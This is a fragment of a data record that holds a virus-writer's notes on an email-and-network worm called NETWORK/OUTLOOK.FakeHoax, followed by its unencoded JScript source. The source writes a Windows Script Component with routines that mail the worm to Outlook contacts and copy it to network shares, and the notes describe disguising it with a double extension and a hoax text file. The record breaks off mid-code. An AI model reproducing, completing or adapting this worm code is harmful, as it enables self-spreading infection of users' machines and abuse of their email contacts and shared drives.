        "macro": "Worm Name: NETWORK/OUTLOOK.FakeHoax\nAuthor: Zulu\nOrigin: Argentina\n\nEncoded JScript/VBScript worm, first in a JSE or VBE file. It uses OUTLOOK and the network\nshares.\nThe main code is a COM object written in XML and VBScript using Windows Script Component, so\nthe code in the JSE and VBE file is trivial. Both versions create a WSC file (the COM object\ndefined in XML) and then both call methods and change properties of that object, no real\nspreading code is in those files.\nThe worm was written in this way to make it easier to port it to any other language, this way\nI was able of creating a JSE and a VBE file without really porting the main code. Also, it's\npossible to create new versions using Delphi, Visual C++, or any other by using \"REGSVR32.EXE\"\nto register the WSC file as a COM object before calling it's methods or changing it's\nproperties.\nThis worm was written to show how JSE and VBE files could be used in viruses/worms, since\nbefore this they where only used as auxiliary files (some versions of HTML.rahC by 1nternal and\nOUTLOOK.Monopoly by me for example). Besides, since it needs Windows Script Host 2.0 or later,\nit won't be good spreading itself at the time of writing this.\nAlso, this was a good opportunity for using Windows Script Component for the first time because\nit made possible to write a JScript and a VBScript version without needing to port the whole\ncode, so this is also the first virus/worm using it's own COM object.\n\nFeatures:\n\n- OUTLOOK spreading. It will use OUTLOOK to send itself to all contacts in the address book if\n  the number of addresses is less than 101. If that number is more than 100 it will try to\n  select 100 random addresses. Subject and body are always the same.\n- Network spreading. It will copy itself to the root of all shares (not only mapped drives),\n  waiting for someone to run it.\n- The worm file (\"WOBBLER.TXT.JSE\" or \"WOBBLER.TXT.VBE\" depending of the version) will show a\n  TXT file when run, so it will show what many users expect.\n  This TXT file will show the Wobbler hoax (the reason of the worm's name), which is a strange\n  social engineering method for a real worm. Anyway, since this won't spread well because of\n  other reasons, even if someone wants to spread it, I won't know if the hoax message is good\n  for this purpose. Message subject and body talk about important information in the TXT file,\n  but they don't talk about the hoax because this could cause fear in the user from opening the\n  file or maybe make the user remember about viruses and checking for double extensions.\n- It has a 1/5 probability of also sending other email to the same addresses of the email\n  having the worm file. The body of this email will have a poem written in spanish.\n  The reason of this is an unusual request from a friend, she wanted one of her poems to be\n  included in a virus/worm.\n  So, even if this means unnecessary bytes and even worse spreading capabilities, here it is. :)\n- There is no need of AV products or removers after running the worm since Windows' settings are\n  not changed and all temporary files are deleted.\n\nHere is the JSE file without encoding:\n\nG=new ActiveXObject(\"Scripting.FileSystemObject\");\nA=G.GetTempName().concat(\".WSC\");\nS=G.CreateTextFile(G.BuildPath(G.GetSpecialFolder(2),A),true);\nS.Write(\"<?XML version=\\\"1.0\\\"?>\\r\\n<component>\\r\\n  <comment>\\r\\n    NETWORK/OUTLOOK.FakeHoax\\r\\n  </comment>\\r\\n  <public>\\r\\n    <property name=\\\"AttachmentFile\\\"/>\\r\\n    <property name=\\\"TextFile\\\"/>\\r\\n    <property name=\\\"WormFile\\\"/>\\r\\n    <method name=\\\"DelTempFiles\\\"/>\\r\\n    <method name=\\\"NetworkSpreading\\\">\\r\\n      <parameter name=\\\"FileName\\\"/>\\r\\n    </method>\\r\\n    <method name=\\\"OutlookSpreading\\\">\\r\\n      <parameter name=\\\"Body\\\"/>\\r\\n      <parameter name=\\\"MaxAmount\\\"/>\\r\\n      <parameter name=\\\"Subject\\\"/>\\r\\n    </method>\\r\\n    <method name=\\\"ShowText\\\">\\r\\n      <parameter name=\\\"Content\\\"/>\\r\\n    </method>\\r\\n  </public>\\r\\n  <script language=\\\"VBScript\\\">\\r\\n    <![CDATA[\\r\\n    Sub DelTempFiles\\r\\n      On Error Resume Next\\r\\n      Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\\r\\n      If FSO.FileExists(AttachmentFile) Then FSO.DeleteFile AttachmentFile, True\\r\\n      If FSO.FileExists(TextFile) Then FSO.DeleteFile TextFile, True\\r\\n      Set FSO = Nothing\\r\\n    End Sub\\r\\n    Sub NetworkSpreading(FileName)\\r\\n      On Error Resume Next\\r\\n      Set Network = CreateObject(\\\"WScript.Network\\\")\\r\\n      Set Shares = Network.EnumNetworkDrives\\r\\n      If Shares.Count > 0 Then\\r\\n        Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\\r\\n        For Counter1 = 0 To Shares.Count - 1\\r\\n          If Shares.Item(Counter1) <> \\\"\\\" Then FSO.CopyFile WormFile, FSO.BuildPath(Shares.Item(Counter1), FileName)\\r\\n        Next\\r\\n        Set FSO = Nothing\\r\\n      End If\\r\\n      Set Shares = Nothing\\r\\n      Set Network = Nothing\\r\\n    End Sub\\r\\n    Sub OutlookSpreading(MaxAmount, Subject, Body)\\r\\n      On Error Resume Next\\r\\n      Set FSO = CreateObject(\\\"Scripting.FileSystemObject\\\")\\r\\n      FSO.CopyFile WormFile, AttachmentFile\\r\\n      Set FSO = Nothing\\r\\n      Outlook = \\\"\\\"\\r\\n      Set Outlook = CreateObject(\\\"Outlook.Application\\\")\\r\\n      If Outlook <> \\\"\\\" Then\\r\\n        Set MAPI = Outlook.GetNameSpace(\\\"MAPI\\\")\\r\\n        For Each List In MAPI.AddressLists\\r\\n          If List.AddressEntries.Count > 0 Then\\r\\n            Set Email1 = Outlook.CreateItem(0)\\r\\n            If List.AddressEntries.Count > MaxAmount Then\\r\\n              Dim Address()\\r\\n              ReDim Address(MaxAmount - 1)\\r\\n              For Counter1 = 0 To MaxAmount - 1\\r\\n                Address(Counter1) = Int(List.AddressEntries.Count * Rnd)\\r\\n              Next\\r\\n              For Counter1 = 0 To MaxAmount - 1\\r\\n                For Counter2 = Counter1 + 1 To MaxAmount - 1\\r\\n                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1\\r\\n                Next\\r\\n              Next\\r\\n              For Counter1 = 0 To MaxAmount - 1\\r\\n                If Address(Counter1) = -1 Then Address(Counter1) = Int(List.AddressEntries.Count * Rnd)\\r\\n              Next\\r\\n              For Counter1 = 0 To MaxAmount - 1\\r\\n                For Counter2 = Counter1 + 1 To MaxAmount - 1\\r\\n                  If Address(Counter1) = Address(Counter2) And Address(Counter1) <> -1 Then Address(Counter2) = -1\\r\\n                Next\\r\\n              Next\\r\\n              For Counter1 = 0 To MaxAmount - 1\\r\\n                If Address(Counter1) <> -1 Then\\r\\n                  Set Entry = List.AddressEntries(Address(Counter1))\\r\\n                  If Counter1 = 0 Then Addresses = Entry.Address Else Addresses = Addresses & \\\";
